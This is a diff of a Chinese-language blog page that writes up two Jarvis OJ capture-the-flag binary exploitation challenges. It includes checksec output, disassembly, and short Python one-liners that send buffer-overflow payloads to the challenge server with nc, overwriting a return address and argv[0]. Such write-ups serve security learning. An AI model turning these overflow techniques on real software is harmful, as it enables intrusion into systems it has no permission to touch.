@@ -17,7 +17,7 @@
 <meta property="og:image" content="http://1nv0k3r.me/2019/01/24/jarvis-oj-pwn-做题记录/3.png">
 <meta property="og:image" content="http://1nv0k3r.me/2019/01/24/jarvis-oj-pwn-做题记录/1.png">
 <meta property="og:image" content="http://1nv0k3r.me/2019/01/24/jarvis-oj-pwn-做题记录/2.png">
-<meta property="og:updated_time" content="2019-01-25T01:26:40.431Z">
+<meta property="og:updated_time" content="2019-01-25T02:16:51.773Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Jarvis Oj Pwn 做题记录">
 <meta name="twitter:description" content="0x01 tell me something Point:100checksec: Arch:     amd64-64-little RELRO:    No RELRO Stack:    No canary found NX:       NX enabled PIE:      No PIE (0x400000) 很明显的漏洞点:int __cdecl main(int argc, con">
@@ -105,7 +105,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-tell-me-something-Point-100"><span class="toc-number">1.</span> <span class="toc-text">0x01 tell me something Point:100</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Smashes-Point-200"><span class="toc-number">2.</span> <span class="toc-text">0x02 Smashes Point:200</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-tell-me-something-Point-100"><span class="toc-number">1.</span> <span class="toc-text">0x01 tell me something Point:100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Smashes-Point-200"><span class="toc-number">2.</span> <span class="toc-text">0x02 Smashes Point:200</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -149,7 +149,7 @@
   
 
   <div class="content" itemprop="articleBody">
-    <h1 id="0x01-tell-me-something-Point-100"><a href="#0x01-tell-me-something-Point-100" class="headerlink" title="0x01 tell me something Point:100"></a>0x01 tell me something Point:100</h1><p>checksec:</p>
+    <h2 id="0x01-tell-me-something-Point-100"><a href="#0x01-tell-me-something-Point-100" class="headerlink" title="0x01 tell me something Point:100"></a>0x01 tell me something Point:100</h2><p>checksec:</p>
 <pre><code>Arch:     amd64-64-little
 RELRO:    No RELRO
 Stack:    No canary found
@@ -182,7 +182,7 @@ PIE:      No PIE (0x400000)
 .text:0000000000400626                 mov     edi, offset filename ; &quot;flag.txt&quot;
 </code></pre><p>地址是0x00400620, 即覆盖返回地址为0x00400620即可, 注意按照小端序, 64位程序补齐高4字节地址</p>
 <p>payload:<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c 'print "A" * 0x88 + "\x20\x06\x40\x00\x00\x00\x00\x00"' | nc pwn.jarvisoj.com 9876</span><br></pre></td></tr></table></figure></p>
-<h1 id="0x02-Smashes-Point-200"><a href="#0x02-Smashes-Point-200" class="headerlink" title="0x02 Smashes Point:200"></a>0x02 Smashes Point:200</h1><pre><code>Arch:     amd64-64-little
+<h2 id="0x02-Smashes-Point-200"><a href="#0x02-Smashes-Point-200" class="headerlink" title="0x02 Smashes Point:200"></a>0x02 Smashes Point:200</h2><pre><code>Arch:     amd64-64-little
 RELRO:    No RELRO
 Stack:    Canary found
 NX:       NX enabled
@@ -207,8 +207,9 @@ FORTIFY:  Enabled
 <p>那么我们只要一直填充数据到地址覆盖到argv[0]即可</p>
 <p>让程序输入一些数据看一下输入开始的地址:</p>
 <p><img src="/2019/01/24/jarvis-oj-pwn-做题记录/2.png" alt="img"></p>
-<p>栈从低地址向高地址增加, argv[0]在高地址, main函数的栈在低地址, 大量数据填充可以让我们的输入覆盖到高地址的argv[0]</p>
+<p>栈从低地址向高地址增加, argv[0]在高地址, main函数的栈在低地址, 然后main函数的栈帧中, 地址由低向高增加, 所以大量数据填充可以让我们的输入覆盖到高地址的argv[0]</p>
 <p>输入处的开始地址为 <code>0x7fffffffdd80</code>, argv[0]的地址为 <code>0x7fffffffe30a</code></p>
+<p>计算一下距离: <code>0x7fffffffe30a - 0x7fffffffdd80 = 14118</code></p>
 <p>所以最终payload为:<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"print('\x21\x0d\x40\x00\x00\x00\x00\x00' * (((0x7fffffffe30a - 0x7fffffffdd80) / 8)) + '\n\n')"</span> | nc pwn.jarvisoj.com <span class="number">9877</span></span><br></pre></td></tr></table></figure></p>
 <p>记录一下格式化字符串:</p>
 <p>格式化占位符（format placeholder），语法是：</p>
@@ -289,7 +290,7 @@ FORTIFY:  Enabled
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-tell-me-something-Point-100"><span class="toc-number">1.</span> <span class="toc-text">0x01 tell me something Point:100</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-Smashes-Point-200"><span class="toc-number">2.</span> <span class="toc-text">0x02 Smashes Point:200</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-tell-me-something-Point-100"><span class="toc-number">1.</span> <span class="toc-text">0x01 tell me something Point:100</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Smashes-Point-200"><span class="toc-number">2.</span> <span class="toc-text">0x02 Smashes Point:200</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
